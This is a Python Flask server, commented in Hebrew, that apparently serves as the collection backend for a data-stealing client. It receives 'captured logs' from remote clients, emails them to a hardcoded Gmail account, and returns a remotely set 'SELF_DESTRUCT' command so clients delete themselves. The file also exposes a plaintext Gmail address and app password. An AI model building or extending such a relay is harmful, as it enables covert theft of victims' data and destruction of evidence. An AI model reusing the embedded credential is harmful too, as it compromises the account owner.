

# --- הגדרות ---
# וודא שהמייל והסיסמה (16 תווים בלי רווחים) נכונים
EMAIL_USER = "n77971507@gmail.com"
EMAIL_PASS = "kcfyrlwmuqqwvgil"

import os
import smtplib
import sys
from flask import Flask, request
from email.message import EmailMessage

app = Flask(__name__)

# --- הגדרות ---
# וודא שהמייל והסיסמה (16 תווים בלי רווחים) נכונים
EMAIL_USER = "n77971507@gmail.com"
EMAIL_PASS = "kcfyrlwmuqqwvgil"

# משתנה לשמירת הפקודה הנוכחית (עבור מחיקה מרחוק)
current_cmd = "OK"


def send_to_mail(subject, content):
    """שליחת מייל מותאמת לפורט 587 (הפורט הפתוח ב-Render)"""
    msg = EmailMessage()
    msg.set_content(content)
    msg['Subject'] = subject
    msg['From'] = EMAIL_USER
    msg['To'] = EMAIL_USER

    try:
        print(f"DEBUG: Connecting to Gmail via Port 587...", file=sys.stderr)

        # התחברות בפורט 587
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # הצפנה חובה לפורט 587

        print(f"DEBUG: Attempting login for {EMAIL_USER}...", file=sys.stderr)
        server.login(EMAIL_USER, EMAIL_PASS)

        server.send_message(msg)
        server.quit()

        print("DEBUG: [SUCCESS] Email sent successfully!", file=sys.stderr)
        return True
    except Exception as e:
        print(f"DEBUG: [ERROR] Mail failed: {str(e)}", file=sys.stderr)
        return False


# --- נתיבי השרת ---

@app.route('/api/v2/client', methods=['POST'])
def client_entry():
    """קבלת נתונים מהלקוח והחזרת פקודת מחיקה אם קיימת"""
    global current_cmd

    # קבלת הנתונים מהלקוח
    data_dict = request.get_json(silent=True)
    if not data_dict:
        return current_cmd, 200

    captured_logs = data_dict.get("data", "")

    if captured_logs:
        print(f"DEBUG: Data received from client. Sending to mail...", file=sys.stderr)
        send_to_mail("New Logs Captured", captured_logs)

    # מחזיר ללקוח את הפקודה (OK או SELF_DESTRUCT)
    # הלקוח צריך לבדוק: if response.text == "SELF_DESTRUCT": os.remove(...)
    return current_cmd, 200


@app.route('/api/admin/command', methods=['POST'])
def set_admin_command():
    """נתיב לניהול פקודות מחיקה מה-UI"""
    global current_cmd
    new_cmd = request.json.get("command")
    if new_cmd:
        current_cmd = new_cmd
        print(f"DEBUG: Admin updated global command to: {current_cmd}", file=sys.stderr)
        return f"Command set to: {current_cmd}", 200
    return "Invalid command", 400


@app.route('/')
def home():
    return "Server is online (V2)", 200


if __name__ == '__main__':
    # Render מגדיר את הפורט במשתנה סביבה PORT
    port = int(os.environ.get("PORT", 10000))

    # שליחת מייל בדיקה ברגע שהשרת עולה
    send_to_mail("Server Status", "V2 Server is now live on Render and ready.")

    app.run(host='0.0.0.0', port=port)